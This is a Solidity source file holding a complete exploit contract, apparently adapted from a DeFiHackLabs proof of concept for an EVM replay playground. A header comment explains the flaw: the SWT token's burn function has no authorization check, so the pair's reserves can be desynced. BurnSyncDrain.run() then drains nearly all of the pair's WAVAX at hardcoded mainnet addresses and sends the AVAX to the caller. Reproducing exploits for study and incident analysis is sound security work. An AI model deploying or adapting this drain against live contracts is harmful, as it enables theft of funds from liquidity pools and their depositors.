// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2025-03-unverified_3f27).
// The DeFiHackLabs PoC (test/unverified_3f27_exp.sol) runs the whole attack
// INLINE in the constructor of `BurnSyncExploit`, deployed with
// `new BurnSyncExploit{value: 0.5 ether}()` from `testExploit()`. Because
// recordExploit.ts always deploys unrecorded and then records exactly one
// function call (a constructor itself can never be the recorded call), this
// is reproduced as a SYNTHETIC exploit: `BurnSyncDrain.run()` (the recorded,
// payable entrypoint) copies the original constructor's five steps verbatim
// — wrap AVAX into WAVAX, swap for 10 SWT, burn the pair's SWT balance down
// to 1 wei and sync(), swap the 10 SWT back for nearly all of the pair's
// WAVAX, then unwrap and forward the proceeds to the caller.
//
// Root cause: the unverified SWT token exposes a public burn(address,uint256)
// with no authorization check on `from` — anyone can burn tokens held by any
// address, including the AMM pair itself. The Uniswap-V2-style pair only
// refreshes its cached reserve0/reserve1 on swap/mint/burn/sync, so an
// external burn of the pair's own SWT balance desyncs its reserves from
// the token's real balance. Following up with sync() bakes the corrupted
// (near-zero) SWT reserve into the pair's AMM math, letting a tiny SWT
// amount (the same 10 SWT bought earlier) buy back nearly the entire WAVAX
// reserve.

interface IERC20Like {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface ISWTLike is IERC20Like {
    function burn(address from, uint256 amount) external;
}

interface IWAVAXLike is IERC20Like {
    function deposit() external payable;
    function withdraw(uint256) external;
}

interface IUniswapV2PairLike {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

contract BurnSyncDrain {
    ISWTLike private constant swt = ISWTLike(0x3f274117f86808D7682BB313Fa31a1583c5028Aa);
    IWAVAXLike private constant wavax = IWAVAXLike(payable(0xB31f66AA3C1e785363F0875A1B74E27b85FD66c7));
    IUniswapV2PairLike private constant pair =
        IUniswapV2PairLike(0x823409261D7c74CcC63485f5488bDc25833Fc5CF);

    // Mirrors BurnSyncExploit's constructor (lines 85-110 of
    // test/unverified_3f27_exp.sol), moved into a callable entrypoint so the
    // recorder can capture it as the single recorded call after an
    // unrecorded deploy.
    function run() external payable {
        // step 1: convert the seed AVAX into pair input liquidity.
        wavax.deposit{value: msg.value}();
        wavax.transfer(address(pair), msg.value);

        // step 2: receive 10 SWT from the pair.
        uint256 swtAmount = 10 ether;
        pair.swap(swtAmount, 0, address(this), "");

        // step 3: burn the pair's SWT balance down to one unit and force
        // reserve synchronization — the core bug: SWT.burn() has no
        // authorization check on `from`, so anyone can gut the pair's own
        // SWT balance out from under it.
        uint256 pairSwtBalance = swt.balanceOf(address(pair));
        swt.burn(address(pair), pairSwtBalance - 1);
        pair.sync();

        // step 4: return the SWT and drain all but one wei of the pair's
        // WAVAX balance, now that the pair's reserves have been desynced.
        swt.transfer(address(pair), swtAmount);
        uint256 wavaxOut = wavax.balanceOf(address(pair)) - 1;
        pair.swap(0, wavaxOut, address(this), "");

        // step 5: unwrap WAVAX and forward native AVAX to the caller.
        wavax.withdraw(wavax.balanceOf(address(this)));
        require(address(this).balance > msg.value, "b1");
        (bool ok, ) = payable(msg.sender).call{value: address(this).balance}("");
        require(ok, "b2");
    }

    // receive to accept the WAVAX withdraw() unwrap.
    receive() external payable {}
}
